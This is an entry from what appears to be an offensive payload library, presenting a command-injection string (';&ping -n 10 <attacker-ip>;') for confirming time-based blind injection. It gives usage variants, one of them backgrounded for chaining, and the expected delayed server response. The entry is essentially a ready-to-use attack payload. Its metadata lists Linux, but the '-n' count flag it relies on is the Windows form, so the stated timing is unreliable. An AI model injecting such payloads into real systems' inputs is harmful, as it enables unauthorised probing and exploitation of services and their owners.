---
data: ;&ping -n 10 <attacker-ip>;
tags:
  - time-delay
  - ping
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.991Z'
id: 5eccf385-32f8-4f25-b2e0-c508f3d02db6
verified: false
validated: true
submitted: true
---
# Ping Injection 10 Seconds

## Command

```bash
;&ping -n 10 <attacker-ip>;
```

## Description

Injected payload to send 10 ICMP pings, creating a ~10s delay for time-based blind injection confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Number of pings (10) | Yes |
| <attacker-ip> | IP to ping (e.g., 1.1.1.1) | Yes |

## Examples

### Basic Usage

```bash
;&ping -n 10 1.1.1.1;
```

### Advanced Usage

```bash
;&ping -n 10 attacker-ip & # Background for chaining
```

## Expected Output

Server response delayed by approximately 10 seconds due to ping completion; no direct output, but timing confirms.

## Related

- [[commands/ping-injection-20]]
